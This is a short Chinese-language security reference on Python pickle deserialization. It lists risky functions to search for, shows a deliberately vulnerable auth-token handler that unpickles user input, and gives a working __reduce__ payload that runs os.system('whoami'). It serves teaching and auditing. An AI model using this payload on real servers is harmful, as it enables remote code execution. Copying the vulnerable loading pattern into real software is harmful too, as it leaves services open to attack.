# Python反序列化

* 在Python源代码中查找：
  * `cPickle.loads`
  * `pickle.loads`
  * `_pickle.loads`
  * `jsonpickle.decode`

## Pickle

以下代码是一个简单的示例，展示了如何使用`cPickle`生成一个序列化的User对象auth_token。
:warning: `import cPickle` 仅在Python 2中有效

```python
import cPickle
from base64 import b64encode, b64decode

class User:
    def __init__(self):
        self.username = "anonymous"
        self.password = "anonymous"
        self.rank     = "guest"

h = User()
auth_token = b64encode(cPickle.dumps(h))
print("Your Auth Token : {}").format(auth_token)
```

当从用户输入加载令牌时，会引入漏洞。

```python
new_token = raw_input("New Auth Token : ")
token = cPickle.loads(b64decode(new_token))
print "Welcome {}".format(token.username)
```

Python 2.7文档明确指出，Pickle不应与不受信任的来源一起使用。让我们创建一个恶意数据，该数据将在服务器上执行任意代码。

> pickle模块对于错误或恶意构造的数据不安全。永远不要反序列化来自不受信任或未经身份验证的来源的数据。

```python
import cPickle, os
from base64 import b64encode, b64decode

class Evil(object):
    def __reduce__(self):
        return (os.system,("whoami",))

e = Evil()
evil_token = b64encode(cPickle.dumps(e))
print("Your Evil Token : {}").format(evil_token)
```

## 参考资料

* [利用Python的“pickle”误用 - 2011年3月20日](https://blog.nelhage.com/2011/03/exploiting-pickle/)
* [Python Pickle注入 - 2017年4月30日](http://xhyumiracle.com/python-pickle-injection/)
